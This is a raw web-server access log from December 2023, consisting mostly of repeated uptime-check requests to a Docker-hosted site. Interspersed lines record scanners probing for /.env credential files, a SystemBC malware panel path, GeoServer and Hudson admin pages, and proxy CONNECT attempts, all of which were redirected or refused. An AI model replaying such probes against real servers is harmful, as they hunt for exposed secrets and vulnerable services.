95.214.235.169 - - [16/Dec/2023:11:24:26 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2068 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:11:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2069 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2070 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2071 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2072 "www@docker" "http://172.29.0.8:80" 0ms
45.56.108.128 - - [16/Dec/2023:11:26:28 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 2073 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:11:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2074 "www@docker" "http://172.29.0.8:80" 1ms
45.56.108.128 - - [16/Dec/2023:11:26:57 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 2075 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2076 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2077 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2078 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2079 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2080 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2081 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2082 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2083 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2084 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2085 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2086 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2087 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.137 - - [16/Dec/2023:11:32:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2088 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2089 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2090 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.148 - - [16/Dec/2023:11:33:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2091 "web-to-websecure@internal" "-" 0ms
64.62.197.139 - - [16/Dec/2023:11:33:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2092 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2093 "www@docker" "http://172.29.0.8:80" 1ms
64.62.197.144 - - [16/Dec/2023:11:34:24 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 2094 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:11:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2095 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.147 - - [16/Dec/2023:11:34:55 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 2096 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2097 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2098 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2099 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2100 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2101 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2102 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2103 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2104 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2105 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2106 "www@docker" "http://172.29.0.8:80" 0ms
68.69.186.30 - - [16/Dec/2023:11:39:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2107 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2108 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2109 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2110 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2111 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2112 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2113 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:11:43:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2114 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:11:43:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2115 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2116 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2117 "www@docker" "http://172.29.0.8:80" 1ms
95.214.235.169 - - [16/Dec/2023:11:43:55 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2118 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:11:43:56 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2119 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2120 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2121 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2122 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2123 "www@docker" "http://172.29.0.8:80" 0ms
192.241.222.61 - - [16/Dec/2023:11:46:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2124 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2125 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2126 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2127 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2128 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2129 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2130 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2131 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2132 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2133 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2134 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2135 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2136 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2137 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2138 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2139 "www@docker" "http://172.29.0.8:80" 0ms
205.210.31.53 - - [16/Dec/2023:11:53:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2140 "web-to-websecure@internal" "-" 0ms
205.210.31.53 - - [16/Dec/2023:11:53:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2141 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:11:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2142 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2143 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2144 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2145 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2146 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2147 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2148 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2149 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2150 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2151 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2152 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2153 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2154 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2155 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2156 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2157 "www@docker" "http://172.29.0.8:80" 1ms
205.185.121.67 - - [16/Dec/2023:12:01:35 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2158 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:12:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2159 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2160 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2161 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2162 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2163 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2164 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2165 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2166 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2167 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2168 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2169 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2170 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2171 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2172 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2173 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2174 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2175 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2176 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2177 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2178 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2179 "www@docker" "http://172.29.0.8:80" 0ms
205.185.121.67 - - [16/Dec/2023:12:12:14 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2180 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:12:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2181 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2182 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2183 "www@docker" "http://172.29.0.8:80" 0ms
94.102.61.10 - - [16/Dec/2023:12:13:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2184 "web-to-websecure@internal" "-" 0ms
94.102.61.10 - - [16/Dec/2023:12:13:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2185 "-" "-" 0ms
54.37.79.75 - - [16/Dec/2023:12:13:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2186 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:12:13:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2187 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:12:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2188 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2189 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2190 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2191 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2192 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:12:16:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2193 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:12:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2194 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2195 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2196 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2197 "www@docker" "http://172.29.0.8:80" 0ms
192.241.216.41 - - [16/Dec/2023:12:17:39 +0000] "GET /hudson HTTP/1.1" 301 17 "-" "-" 2198 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:12:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2199 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2200 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2201 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2202 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2203 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2204 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2205 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2206 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2207 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2208 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2209 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2210 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2211 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2212 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2213 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2214 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2215 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2216 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2217 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2218 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:12:27:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2219 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:12:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2220 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2221 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2222 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2223 "www@docker" "http://172.29.0.8:80" 1ms
192.241.239.40 - - [16/Dec/2023:12:29:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2224 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:12:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2225 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2226 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2227 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2228 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2229 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2230 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2231 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2232 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2233 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2234 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2235 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2236 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2237 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2238 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2239 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2240 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2241 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2242 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2243 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2244 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2245 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2246 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2247 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:12:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2248 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:12:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2249 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:12:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2250 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:12:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2251 "www@docker" "http://172.29.0.8:80" 1ms
